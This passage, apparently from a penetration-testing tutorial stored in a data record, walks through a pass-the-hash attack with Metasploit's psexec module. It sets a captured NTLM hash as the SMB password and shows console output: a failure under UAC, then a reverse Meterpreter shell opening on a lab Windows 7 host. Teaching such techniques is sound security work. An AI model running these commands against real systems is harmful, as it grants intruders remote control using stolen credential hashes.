- img_proc: false
  md: 'Okay we have the target system IP address set, and we have the user Alice selected.
    We just need to set the SMB password. This is where the magic starts. Instead
    of putting in a password, which we don''t know, we can just use the password hash!


    +   5. Type "*set SMBPass*" and copy and paste in her password hash, then press
    enter:


    ```

    msf exploit(psexec) > set SMBUser Alice

    SMBUser => Alice

    msf exploit(psexec) > set SMBPass aad3b435b51404eeaad3b435b51404ee:2e4dbb83aa056289935daea328977b26

    ```


    *(Paste in the entire hash as shown above. Leave out the user ID part of the user
    account a "1001:" in this case, and leave off the trailing three ":"''s at the
    end.)*


    And the results?


    On an updated Windows 7 system with the UAC set to any level other than off, nothing
    happens! You get an Access Denied error message and no connection:


    ```

    msf exploit(psexec) > exploit


    [*] Started reverse handler on 192.168.198.134:4444

    [*] Connecting to the server...

    [*] Authenticating to 192.168.198.132:445|WORKGROUP as user ''Alice''...

    [*] Uploading payload...

    [-] Exploit failed [no-access]: Rex::Proto::SMB::Exceptions::ErrorCode The server
    responded with error: STATUS_ACCESS_DENIED (Command=117 WordCount=0)

    msf exploit(psexec) >

    ```


    But on a system that has UAC turned completely off, it is a different story:


    ```

    msf exploit(psexec) > exploit


    [*] Started reverse handler on 192.168.198.134:4444

    [*] Connecting to the server...

    [*] Authenticating to 192.168.198.132:445|WORKGROUP as user ''Alice''...

    [*] Uploading payload...

    [*] Created \HykvxCtw.exe...

    [*] Binding to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:192.168.198.132[\svcctl]
    ...

    [*] Bound to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:192.168.198.132[\svcctl]...

    [*] Obtaining a service manager handle...

    [*] Creating a new service (lJZmNLLI - "MaLxmMrOYVMx")...

    [*] Closing service handle...

    [*] Opening service...

    [*] Starting the service...

    [*] Removing the service...

    [*] Closing service handle...

    [*] Deleting \HykvxCtw.exe...

    [*] Sending stage (752128 bytes) to 192.168.198.132

    [*] Meterpreter session 2 opened (192.168.198.134:4444 -> 192.168.198.132:49488)
    at 2013-09-25 12:05:20 -0400


    meterpreter >

    ```


    This is what happens in real life sometimes when testing security. What seems
    to be an opening just may not work. So you back up and try something else. In
    this case we were not able to get a shell with UAC enabled, but got it without
    problem with a system with UAC disabled.


    # Passing the Hash Toolkit'
